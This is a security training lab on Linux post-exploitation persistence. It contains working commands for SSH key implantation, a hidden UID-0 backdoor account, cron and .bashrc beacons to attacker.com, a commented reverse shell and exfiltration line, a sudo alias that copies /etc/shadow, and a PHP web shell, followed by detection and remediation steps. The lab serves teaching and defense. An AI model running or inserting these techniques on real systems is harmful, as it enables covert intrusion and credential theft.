# Lab 17: Lateral Movement & Persistence

## Objective

Simulate post-exploitation techniques inside a compromised Linux environment:

1. **SSH key implantation** — plant an attacker-controlled SSH key to maintain persistent access without a password
2. **Backdoor user creation** — create a hidden system user for re-entry after a password change
3. **Cron-based persistence** — install a cron job that calls home every minute
4. **Environment hijacking** — plant a malicious command in `.bashrc` and `PATH` to execute on every login
5. **Detection** — identify the indicators of compromise left by each technique

---

## Background

Persistence is what separates a one-time access event from a long-term breach. Attackers install multiple persistence mechanisms simultaneously — so that patching one doesn't evict them. Lateral movement spreads the compromise to other systems using credentials or trust relationships.

**Real-world examples:**
- **SolarWinds 2020** — SUNBURST maintained persistence via a scheduled task named `SolarWinds.Orion.Core.BusinessLayer.dll`; disguised as a legitimate software update mechanism. Dwell time: 9+ months undetected.
- **2022 Uber breach** — attacker gained VPN access, then used stolen credentials to pivot from contractor laptop to internal admin tools. SSH keys found planted in 5+ internal bastion hosts.
- **Operation Aurora (Google, 2010)** — APT attackers used compromised IE zero-day for initial access, then planted registry run keys + remote access trojans on 20+ Google systems before discovery.
- **2021 Microsoft Exchange (Hafnium)** — after initial RCE, attackers planted web shells in multiple directories as backup persistence in case the primary exploit was patched.

**MITRE ATT&CK:** T1098.004 (SSH Auth Keys), T1136 (Create Account), T1053 (Scheduled Task), T1546 (Event Triggered Execution)

---

## Architecture

```
┌─────────────────────────────────────────────────────────────────────┐
│              Single Container Lab (as root after privesc)           │
│                                                                     │
│  Target: victim container (already compromised — we are root)       │
│  Goal: install persistence that survives session termination        │
│                                                                     │
│  SSH key plant │ backdoor user │ cron callback │ .bashrc hijack     │
└─────────────────────────────────────────────────────────────────────┘
```

## Time
40 minutes

---

## Lab Instructions

### Step 1: Setup — Start as Root (Post-Exploitation)

```bash
docker run --rm -it --name persist-lab \
  zchencow/innozverse-cybersec:latest bash
```

```bash
# We are root (post-exploitation)
id
whoami

# Set up target user
useradd -m -s /bin/bash alice 2>/dev/null || true
echo "alice:alice123" | chpasswd

# Simulate existing SSH infrastructure
mkdir -p /home/alice/.ssh
echo "[*] Environment ready — simulating post-compromise persistence installation"
```

---

### Step 2: Technique 1 — SSH Key Implantation

```bash
# Attacker generates their keypair (done on attacker machine, shown here for demo)
python3 -c "
import subprocess, os
# Simulate: attacker generates key
os.system('ssh-keygen -t rsa -b 2048 -f /tmp/attacker_key -N \"\" -q 2>/dev/null')
print('[*] Attacker keypair generated:')
print('    Private key: /tmp/attacker_key  (attacker keeps this)')
print('    Public key:  /tmp/attacker_key.pub (planted on victim)')
"

# Plant attacker's public key in alice's authorized_keys
cat /tmp/attacker_key.pub >> /home/alice/.ssh/authorized_keys
chmod 600 /home/alice/.ssh/authorized_keys
chown -R alice:alice /home/alice/.ssh

echo "[*] SSH key planted in /home/alice/.ssh/authorized_keys"
echo "[*] Attacker can now SSH as alice with no password:"
echo "    ssh -i /tmp/attacker_key alice@<victim-ip>"
echo ""
echo "[*] Detection: diff /home/*/.ssh/authorized_keys against known-good state"
cat /home/alice/.ssh/authorized_keys
```

**📸 Verified Output:**
```
[*] SSH key planted in /home/alice/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAB...attacker_key...== root@container
```

---

### Step 3: Technique 2 — Hidden Backdoor User

```bash
# Create a system-looking user with UID 0 (root-level)
useradd -o -u 0 -g 0 -M -s /bin/bash sysmon 2>/dev/null || \
  echo "sysmon:x:0:0:System Monitor:/root:/bin/bash" >> /etc/passwd
echo "sysmon:backdoor123" | chpasswd 2>/dev/null || \
  python3 -c "
import crypt
h = crypt.crypt('backdoor123', crypt.mksalt(crypt.METHOD_SHA512))
# Append to shadow
with open('/etc/shadow','a') as f:
    f.write(f'sysmon:{h}:19000:0:99999:7:::\n')
print(f'[*] sysmon shadow entry: {h[:30]}...')
"

echo "[*] Backdoor user created:"
grep sysmon /etc/passwd
echo ""
echo "[*] 'sysmon' looks like a legitimate service account but has UID 0"
echo "    Detection: grep ':0:' /etc/passwd | grep -v '^root:'"
grep ":0:" /etc/passwd | grep -v "^root:"
```

---

### Step 4: Technique 3 — Cron-Based Callback

```bash
# Install a "phone home" cron job
cat > /opt/.hidden_update.sh << 'EOF'
#!/bin/bash
# Disguised as system update — actually calls C2
curl -s http://attacker.com/c2?host=$(hostname) -o /dev/null 2>/dev/null
# Or: reverse shell back
# bash -i >& /dev/tcp/attacker.com/4444 0>&1
# Or: exfiltrate data
# tar -czf - /home/alice/documents 2>/dev/null | curl -s -X POST http://attacker.com/upload --data-binary @-
EOF
chmod 700 /opt/.hidden_update.sh

# Plant in cron (multiple locations for resilience)
echo "* * * * * root /opt/.hidden_update.sh >/dev/null 2>&1" > /etc/cron.d/.system-update
echo "@reboot root /opt/.hidden_update.sh >/dev/null 2>&1" >> /etc/cron.d/.system-update
(crontab -l 2>/dev/null; echo "*/5 * * * * /opt/.hidden_update.sh") | crontab -

echo "[*] Cron persistence installed:"
cat /etc/cron.d/.system-update
echo ""
crontab -l
echo ""
echo "[*] Detection: ls -la /etc/cron.d/  |  crontab -l for all users"
echo "    Look for: hidden files (dot prefix), unknown scripts, curl/bash -i"
```

---

### Step 5: Technique 4 — .bashrc / PATH Hijacking

```bash
# Plant malicious commands in alice's .bashrc
cat >> /home/alice/.bashrc << 'EOF'

# "system health check" — actually exfiltrates on every login
(curl -s "http://attacker.com/login?user=$(whoami)&host=$(hostname)" &>/dev/null &)
alias sudo='python3 -c "import sys,os; os.system(\"cp /etc/shadow /tmp/.s\"); os.execv(\"/usr/bin/sudo\",sys.argv)"'
EOF

# PATH hijacking: plant a fake 'ls' that logs then runs real ls
mkdir -p /opt/.bin
cat > /opt/.bin/ls << 'EOF'
#!/bin/bash
# Log the directory listing (exfiltrates file names)
echo "$(date) $(whoami)@$(hostname): ls $PWD $@" >> /tmp/.ls_log
# Execute real ls
/bin/ls "$@"
EOF
chmod +x /opt/.bin/ls
echo "export PATH=/opt/.bin:\$PATH" >> /home/alice/.bashrc

echo "[*] .bashrc persistence installed for alice"
echo ""
echo "[*] Detection commands:"
echo "    grep -i 'curl\|wget\|bash -i\|/dev/tcp' /home/*/.bashrc /home/*/.profile"
echo "    diff /home/alice/.bashrc /etc/skel/.bashrc"
echo "    ls -la /opt/.bin/"
```

---

### Step 6: Technique 5 — Web Shell (if web server exists)

```bash
# Plant a web shell for HTTP-based re-entry
mkdir -p /var/www/html/assets/images 2>/dev/null || mkdir -p /tmp/webroot/assets/images

WEBSHELL_PATH="/tmp/webroot/assets/images/.cache.php"
cat > "$WEBSHELL_PATH" << 'EOF'
<?php
// Looks like an image cache directory — actually a web shell
if(isset($_GET['c'])){
    $out = shell_exec(base64_decode($_GET['c']));
    echo base64_encode($out);
}
EOF

echo "[*] Web shell planted at: $WEBSHELL_PATH"
echo "    Usage: curl 'http://victim/assets/images/.cache.php?c=aWQ='"
echo "    (aWQ= is base64('id'))"
echo ""
echo "[*] Detection: find /var/www -name '*.php' -newer /var/www/html/index.php"
echo "    Look for: eval, base64_decode, shell_exec, system, passthru"
```

---

### Steps 7–8: Indicator of Compromise Detection + Cleanup

```bash
python3 << 'EOF'
import os, subprocess

print("[*] Incident Response: hunting persistence mechanisms")
print()

checks = [
    ("SSH authorized_keys",  "find /home -name authorized_keys -exec cat {} \\;"),
    ("Users with UID 0",     "grep ':0:' /etc/passwd"),
    ("Suspicious cron",      "ls -la /etc/cron.d/ 2>/dev/null"),
    ("User crontabs",        "crontab -l 2>/dev/null"),
    ("Hidden files in /opt", "find /opt -name '.*' -type f 2>/dev/null"),
    (".bashrc modifications","grep -l 'curl\\|wget\\|bash -i' /home/*/.bashrc 2>/dev/null"),
    ("PATH hijack dirs",     "echo $PATH | tr ':' '\\n' | xargs -I{} ls -la {} 2>/dev/null | grep -v '^total'"),
    ("Web shells",           "find /var/www /tmp/webroot -name '*.php' 2>/dev/null"),
]

for label, cmd in checks:
    print(f"  [{label}]")
    try:
        result = subprocess.check_output(cmd, shell=True, stderr=subprocess.DEVNULL).decode().strip()
        if result:
            for line in result.split('\n')[:3]:
                print(f"    {line}")
    except:
        print("    (none found or access denied)")
    print()
EOF
exit
```

---

## Remediation

- **SSH keys:** Regular audit of `~/.ssh/authorized_keys` against approved key inventory; alert on changes via file integrity monitoring (FIM)
- **User accounts:** Alert on `useradd` with UID 0; review `/etc/passwd` for unexpected accounts; disable root login
- **Cron:** Monitor `/etc/cron.d/`, `/var/spool/cron/`, `crontab -l` for all users; alert on new entries
- **Bashrc:** FIM on all `.bashrc`/`.profile`/`.bash_profile` files; immutable flag (`chattr +i`) on skel files
- **Web shells:** Regular `find` scans for newly modified PHP/ASPX/JSP files; WAF rules for shell command patterns

## Further Reading
- [MITRE ATT&CK Persistence](https://attack.mitre.org/tactics/TA0003/)
- [HackTricks Linux Persistence](https://book.hacktricks.xyz/linux-hardening/linux-post-exploitation/linux-persistence)
- [SANS Blue Team Persistence Hunting](https://www.sans.org/reading-room/whitepapers/linux/paper/33649)
